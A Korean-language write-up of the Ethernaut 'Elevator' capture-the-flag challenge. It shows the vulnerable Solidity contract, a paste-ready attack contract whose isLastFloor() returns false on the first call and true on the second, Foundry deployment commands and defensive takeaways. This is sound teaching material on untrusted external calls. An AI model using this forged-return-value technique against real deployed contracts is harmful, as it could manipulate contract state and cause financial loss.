Elevator — Ethernaut Writeup

목표: top 변수를 true로 만들기

문제 개요

Elevator 컨트랙트는 외부 Building 인터페이스의 isLastFloor()를 호출합니다.
인터페이스는 호출 대상(즉, msg.sender)이 반환값을 자유롭게 정할 수 있기 때문에 호출자 쪽에서 반환값을 조작할 수 있습니다.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

핵심 관찰점

goTo()에서 building.isLastFloor()를 두 번 호출한다.

if 문을 통과하려면 **첫 번째 호출이 false**여야 한다.

top을 true로 만들려면 **두 번째 호출이 true**여야 한다.

따라서 첫 번째 호출과 두 번째 호출에서 다른 값을 반환하도록 isLastFloor()를 구현하면 문제 해결 가능.

공격 전략

공격자는 Building 인터페이스를 구현한 컨트랙트를 배포한다.

이 컨트랙트의 isLastFloor()는 1번째 호출에서 false, 2번째 호출에서 true를 반환하도록 상태를 변경한다.

그런 다음 공격 컨트랙트에서 Elevator.goTo()를 호출하면 msg.sender가 공격 컨트랙트가 되므로 Elevator는 공격 컨트랙트의 isLastFloor()를 호출한다.

Exploit 코드 (붙여넣기용)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract AttackBuilding {
    bool private toggle;
    Elevator public elevator;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
        toggle = false;
    }

    // Building 인터페이스를 흉내낸 함수
    // 첫 호출: false, 두 번째 호출: true
    function isLastFloor(uint256) external returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    // 실제 공격 실행 함수
    function attack(uint256 _floor) external {
        elevator.goTo(_floor);
    }
}

실행 절차 (간단 가이드)
1) 컴파일 & 배포

Remix: AttackBuilding을 컴파일 → Elevator 주소를 생성자 인자로 넣어 배포

Foundry (예시)

forge create --rpc-url <RPC_URL> --private-key <PK> src/AttackBuilding.sol:AttackBuilding --constructor-args <ELEVATOR_ADDRESS>

또는 테스트 스크립트에서 vm.deal 등으로 환경 구성 후 배포

2) 공격 실행

배포된 AttackBuilding.attack(floor) 호출 (예: 42)

호출 후 Elevator.top 값을 확인하면 true가 되어 있음

동작 예시 (호출 흐름)

AttackBuilding.attack(42) 호출 → 내부에서 Elevator.goTo(42) 호출

Elevator.goTo 내부:

첫 번째 building.isLastFloor(42) 호출 → 공격 컨트랙트의 isLastFloor가 실행되어 false 반환 (toggle: false → true)

if 조건이 만족하므로 floor = 42 설정

두 번째 building.isLastFloor(floor) 호출 → 공격 컨트랙트의 isLastFloor가 다시 실행되어 true 반환 (toggle: true → false)

top = true로 설정

핵심 교훈 (Takeaways)

Solidity 인터페이스는 행동을 강제하지 않음: 호출자는 인터페이스 규약을 "따르는 척" 하면서 원하는 값을 반환할 수 있다.

msg.sender가 누구인지, 외부 호출이 몇 번 일어나는지, 호출 순서가 어떤 영향을 주는지 등을 주의 깊게 설계해야 한다.

외부 컨트랙트에 의존하는 로직은 재진입, 상태조작, 위조된 반환값 등의 공격 벡터를 고려해야 한다.

참고: 안전한 방어 방법 (간단히)

외부 호출에 의존하는 상태 변경은 가능한 한 단일 호출 내에서 결정하거나, 신뢰할 수 있는 소스만 사용하도록 설계한다.